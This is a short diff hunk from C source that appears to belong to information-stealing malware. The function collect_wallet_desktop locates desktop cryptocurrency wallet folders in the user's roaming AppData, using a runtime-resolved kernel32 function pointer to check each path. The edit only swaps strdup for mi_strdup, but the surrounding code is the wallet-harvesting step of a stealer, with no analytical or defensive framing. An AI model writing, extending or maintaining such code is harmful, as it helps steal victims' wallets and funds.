@@ -149,8 +149,8 @@ WalletDesktopData *collect_wallet_desktop(const char *roaming_app_data, size_t *
         if (!wd_ensure_k32()) break;
         DWORD attr = g_wd_k32.pGFAA(full_path);
         if (attr != INVALID_FILE_ATTRIBUTES) {
-            results[found].name = strdup(desktop_names[i]);
-            results[found].path = strdup(full_path);
+            results[found].name = mi_strdup(desktop_names[i]);
+            results[found].path = mi_strdup(full_path);
             results[found].file_count = 0;
             results[found].files = NULL;
             found++;
